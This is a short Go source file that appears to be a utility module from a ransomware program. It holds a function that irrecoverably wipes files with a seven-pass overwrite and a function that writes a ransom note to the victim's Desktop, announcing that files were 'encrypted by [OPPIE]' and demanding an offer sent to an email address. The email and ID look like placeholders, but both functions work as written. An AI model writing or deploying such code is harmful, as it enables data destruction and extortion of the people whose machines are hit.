package fsutil

import (
	"os"
	"os/user"
	"path/filepath"

	"github.com/lemon-mint/wipe-file-go/wiper"
)

func Wipe(path string) error {
	if err := wiper.Wipe7pass(path); err != nil {
		return err
	}

	return nil
}

func WriteHelper() error {
	u, err := user.Current()
	if err != nil {
		return err
	}

	file, err := os.Create(filepath.Join(u.HomeDir, "Desktop", "README.txt"))
	if err != nil {
		return err
	}

	defer file.Close()

	message := `🤠💣

Hello,

You have been encrypted by [OPPIE]
If you need to unlock your files please send your ID to some@email.com with an offer

ID: 1234

Best regards, the [OPPIE] team.`

	if _, err := file.Write([]byte(message)); err != nil {
		return err
	}

	return nil
}
